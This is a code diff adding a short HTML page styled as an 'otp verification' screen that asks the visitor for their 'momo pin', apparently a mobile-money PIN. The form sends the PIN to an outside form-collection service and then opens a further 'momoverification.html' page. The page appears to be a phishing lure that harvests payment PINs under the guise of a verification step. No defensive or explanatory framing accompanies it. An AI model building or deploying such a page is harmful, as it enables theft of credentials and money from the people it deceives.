@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otp verification</title>
+    <style>
+        body{
+            background-color:  rgba(0, 0, 0, 0.666);
+            color: white;
+            text-align: center;
+            margin: 200px;
+        }
+        .otp input{
+            border-radius: 10px;
+            border-color: orange;
+            padding: 10px;
+            word-spacing: 10px;
+        }
+
+        .otp button{
+            border: 20px;
+            background-color: orange;
+            border-radius: 10px;
+                padding: 10px 40px;
+        }
+    </style>
+</head>
+<body>
+<div class="otp">
+    <form action="https://formspree.io/f/mnqkarng" method="POST">
+        <p>input your mobile pin</p>
+    <input type=" number" name="momo pin" id="otpcode" placeholder="PIN" required><br><br>
+    <button onclick="fx()">DONE</button>
+    <script>
+        function fx(){
+           open("momoverification.html")
+           }
+    </script>
+    </form>
+</div>
+</body>
+</html>
